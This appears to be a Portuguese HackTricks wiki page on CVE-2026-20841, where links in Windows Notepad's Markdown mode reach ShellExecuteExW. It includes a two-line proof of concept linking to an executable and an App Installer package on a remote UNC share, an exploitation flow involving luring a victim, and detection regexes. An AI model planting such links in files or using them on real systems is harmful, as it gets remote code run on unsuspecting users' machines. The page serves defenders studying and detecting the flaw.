# Abuso de Protocol Handler / ShellExecute do Windows (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Aplicações do Windows que renderizam Markdown ou HTML podem encaminhar destinos clicados para `ShellExecuteExW`. Como o ShellExecute despacha URI schemes registrados e associações de arquivos, um renderer precisa de uma allowlist explícita em vez de presumir que todo link seja HTTP(S). O comportamento do Notepad descrito abaixo refere-se à CVE-2026-20841 e não deve ser generalizado para todo renderer.<sup>[[1]](#references)[[3]](#references)</sup>

## Superfície do ShellExecuteExW no modo Markdown do Windows Notepad
- O Notepad escolhe o modo Markdown **somente para extensões `.md`** por meio de uma comparação de strings fixa em `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Links Markdown suportados:
- Standard: `[text](target)`
- Autolink: `<target>` (renderizado como `[target](target)`), portanto ambas as sintaxes são relevantes para payloads e detecções.
- Os cliques em links são processados em `sub_140170F60()`, que realiza uma filtragem fraca e depois chama `ShellExecuteExW`.
- `ShellExecuteExW` despacha para **qualquer protocol handler configurado**, não apenas HTTP(S).<sup>[[1]](#references)</sup>

### Considerações sobre payloads
- Quaisquer sequências `\\` no link são **normalizadas para `\`** antes de `ShellExecuteExW`, afetando a criação e a detecção de UNC/path.
- Arquivos `.md` **não são associados ao Notepad por padrão**; a vítima ainda precisa abrir o arquivo no Notepad e clicar no link, mas, depois de renderizado, o link pode ser clicado.
- Schemes perigosos de exemplo:<sup>[[1]](#references)</sup>
- `file://` para iniciar um payload local/UNC.
- `ms-appinstaller://` para acionar fluxos do App Installer. Outros schemes registrados localmente também podem ser abusáveis.

### PoC mínimo em Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Fluxo de exploração
1. Crie um arquivo **`.md`** para que o Notepad o renderize como Markdown.
2. Incorpore um link usando um URI scheme perigoso (`file:`, `ms-appinstaller:` ou qualquer handler instalado).
3. Entregue o arquivo (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ou similar) e convença o usuário a abri-lo no Notepad.
4. Ao clicar, o **link normalizado** é enviado para `ShellExecuteExW`, e o protocol handler correspondente executa o conteúdo referenciado no contexto do usuário.<sup>[[1]](#references)[[2]](#references)</sup>

## Ideias de detecção
- Monitore transferências de arquivos `.md` por portas/protocolos que normalmente entregam documentos: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analise links Markdown (standard e autolink) e procure por `file:` ou `ms-appinstaller:` **sem distinção entre maiúsculas e minúsculas**.
- Regexes orientadas por vendors para detectar acesso a recursos remotos:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- A correção do fornecedor descrita pela ZDI restringe os alvos aceitos a arquivos locais e HTTP(S). Amplie as detecções para outros protocol handlers instalados conforme necessário, pois a superfície de ataque registrada varia de acordo com o sistema.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Execução arbitrária de código no Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC do CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
